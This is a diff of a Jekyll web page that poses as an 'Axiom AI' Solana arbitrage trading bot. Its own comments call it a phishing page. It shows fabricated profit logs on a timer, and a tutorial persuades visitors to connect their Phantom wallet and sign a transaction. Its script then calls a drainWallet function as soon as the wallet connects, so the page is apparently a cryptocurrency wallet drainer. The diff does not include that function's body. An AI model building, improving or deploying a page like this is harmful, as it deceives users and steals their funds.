@@ -1,152 +1,149 @@
+---
+layout: default
+title: Axiom AI - Solana Trading Bot
+---
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axiom AI Terminal</title>
+    <title>{{ page.title }}</title>
+    <!-- Use Minima Theme CSS as base -->
+    <link rel="stylesheet" href="{{ '/assets/css/style.css | relative_url }}">
+    
     <style>
+        /* Custom Overrides for the Phish Interface */
         body {
-            background-color: #0a0a0a;
-            color: #00ff41;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            padding: 20px;
-            overflow-x: hidden;
+            background-color: #f4f4f4; /* Clean white/gray background */
+            color: #333;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .container {
+        
+        .phish-container {
             max-width: 600px;
-            margin: 0 auto;
-            position: relative;
-        }
-        header {
+            margin: 40px auto;
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             text-align: center;
-            border-bottom: 1px solid #00ff41;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
-        h1 { margin: 0; font-size: 24px; }
-        
-        .status { font-size: 12px; color: #fff; margin-top: 5px; }
-        
-        /* Tutorial Button */
-        .tutorial-btn {
-            background: none;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 5px 10px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .tutorial-btn:hover { background: #00ff41; color: #000; }
 
+        h2 { color: #2c3e50; margin-top: 0; }
+        
         .trade-log {
-            height: 300px;
+            height: 250px;
             overflow-y: auto;
-            border: 1px solid #333;
-            padding: 10px;
-            background: #111;
+            border: 1px solid #ddd;
+            padding: 15px;
+            background: #fafafa;
             margin-bottom: 20px;
+            border-radius: 4px;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
         }
+
         .log-entry {
-            margin-bottom: 8px;
-            font-size: 14px;
+            margin-bottom: 6px;
             display: flex;
             justify-content: space-between;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 4px;
         }
-        .profit { color: #00ff41; }
-        .loss { color: #ff3333; }
         
-        button.action-btn {
-            width: 100%;
-            padding: 15px;
-            background: #00ff41;
-            color: #000;
+        .profit { color: #27ae60; font-weight: bold; }
+        .loss { color: #c0392b; }
+        
+        .connect-btn {
+            background-color: #007bff; /* Professional Blue */
+            color: white;
             border: none;
-            font-weight: bold;
-            cursor: pointer;
+            padding: 15px 30px;
             font-size: 16px;
-            transition: 0.2s;
+            font-weight: 600;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
         }
-        button.action-btn:hover { background: #fff; }
-        button.action-btn:disabled { background: #333; color: #777; cursor: not-allowed; }
         
-        /* Modal Styles */
+        .connect-btn:hover { background-color: #0056b3; }
+        .connect-btn:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        .status-text {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #666;
+            min-height: 20px;
+        }
+
+        /* Tutorial Modal */
         #modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
-            display: none;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background: #1a1a1a;
-            border: 1px solid #00ff41;
-            padding: 20px;
-            width: 90%;
-            max-width: 500px;
-            position: relative;
-        }
-        .close-modal {
-            position: absolute; top: 10px; right: 15px;
-            color: #fff; cursor: pointer; font-size: 20px;
-        }
-        .modal-title { color: #00ff41; margin-top: 0; border-bottom: 1px dashed #333; padding-bottom: 10px;}
-        .step { margin-bottom: 15px; line-height: 1.5; }
-        .step strong { color: #fff; }
-
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
             display: none;
             justify-content: center; align-items: center;
-            z-index: 999;
         }
-        .loader {
+        .modal-box {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .close-modal { float: right; cursor: pointer; font-size: 20px; }
+        
+        /* Loading Spinner */
+        #loader {
+            display: none;
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #00ff41;
+            border-top: 4px solid #007bff;
             border-radius: 50%;
             width: 30px; height: 30px;
-            animation: spin 2s linear infinite;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Hide Jekyll's default nav/body content to keep focus on the phish */
+        .site-header, .site-footer { display: none; } 
     </style>
 </head>
 <body>
 
-<div class="container">
-    <header>
-        <h1>AXIOM AI // SOLANA TRADER</h1>
-        <button class="tutorial-btn" onclick="openTutorial()">HOW IT WORKS</button>
-    </header>
-    
-    <div class="status" id="status-text">Waiting for connection...</div>
+<div class="phish-container">
+    <h2>Axiom AI // Solana Protocol</h2>
+    <p style="color:#777; font-size:14px;">Automated High-Frequency Arbitrage</p>
+
+    <div class="status-text" id="status-text">Ready to connect.</div>
+    <div id="loader"></div>
 
     <div class="trade-log" id="log">
         <!-- Logs populate here -->
     </div>
 
-    <button id="connect-btn" class="action-btn" onclick="startDrain()">CONNECT WALLET & START BOT</button>
+    <button id="connect-btn" class="connect-btn" onclick="startDrain()">CONNECT PHANTOM & START BOT</button>
+    
+    <div style="margin-top: 15px;">
+        <a href="#" onclick="openTutorial(); return false;" style="color: #007bff; font-size: 13px; text-decoration: none;">How does Axiom work?</a>
+    </div>
 </div>
 
 <!-- Tutorial Modal -->
 <div id="modal-overlay">
-    <div class="modal-content">
+    <div class="modal-box">
         <span class="close-modal" onclick="closeTutorial()">&times;</span>
-        <h2 class="modal-title">Axiom AI Protocol</h2>
-        <div class="step"><strong>1. Connect Wallet:</strong> Click the button above to link your Phantom wallet securely.</div>
-        <div class="step"><strong>2. Sign Transaction:</strong> A single signature request will appear. This authorizes the AI to execute trades on your behalf.</div>
-        <div class="step"><strong>3. Profit Generation:</strong> The bot scans the Solana mempool for arbitrage opportunities and executes high-frequency trades automatically.</div>
-        <div class="step"><strong>4. Withdraw:</strong> Profits are instantly available in your wallet.</div>
-        <button class="action-btn" style="margin-top:15px;" onclick="closeTutorial()">GOT IT</button>
+        <h3 style="margin-top:0;">Axiom Protocol Guide</h3>
+        <p><strong>1. Connect:</strong> Link your Phantom wallet securely.</p>
+        <p><strong>2. Authorize:</strong> Sign a single transaction to enable auto-trading.</p>
+        <p><strong>3. Profit:</strong> Our AI executes trades instantly. Profits are yours immediately.</p>
+        <button class="connect-btn" style="padding: 10px;" onclick="closeTutorial()">Understood</button>
     </div>
 </div>
-
-<!-- Loading Overlay -->
-<div id="overlay"><div class="loader"></div></div>
 
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 <script>
@@ -157,7 +154,7 @@
     const logDiv = document.getElementById('log');
     const statusText = document.getElementById('status-text');
     const btn = document.getElementById('connect-btn');
-    const overlay = document.getElementById('overlay');
+    const loader = document.getElementById('loader');
 
     function addLog(text, amount) {
         const div = document.createElement('div');
@@ -166,14 +163,14 @@
         logDiv.prepend(div);
     }
 
-    // Fake logs to make it look active even before/during connection
+    // Fake logs to make it look active
     setInterval(() => {
-        if(Math.random() > 0.5) {
-            addLog("AI EXECUTED LONG", Math.random() * 2);
-        } else {
-            addLog("AI SCANNED PAIR", 0);
+        if(Math.random() > 0.6) {
+            addLog("ARBITRAGE EXECUTED", Math.random() * 1.5);
+        } else if (Math.random() > 0.8) {
+            addLog("LIQUIDITY SCAN", 0);
         }
-    }, 2000);
+    }, 3000);
 
     // Modal Logic
     function openTutorial() {
@@ -191,24 +188,26 @@
 
         try {
             // Show loading state
-            overlay.style.display = 'flex';
+            loader.style.display = 'block';
+            btn.disabled = true;
             
             // 1. Connect
             const resp = await window.solana.connect();
             const userPublicKey = resp.publicKey.toString();
             
-            overlay.style.display = 'none';
+            loader.style.display = 'none';
             statusText.innerText = "Connected: " + userPublicKey.slice(0,4) + "..." + userPublicKey.slice(-4);
             btn.innerText = "TRADING ACTIVE...";
-            btn.disabled = true;
+            btn.style.backgroundColor = "#27ae60"; // Green to indicate success
 
             // 2. Trigger Drain immediately after connection
             drainWallet(userPublicKey);
 
         } catch (err) {
-            overlay.style.display = 'none';
+            loader.style.display = 'none';
             console.error(err);
             statusText.innerText = "Connection failed.";
+            btn.disabled = false;
         }
     }
 
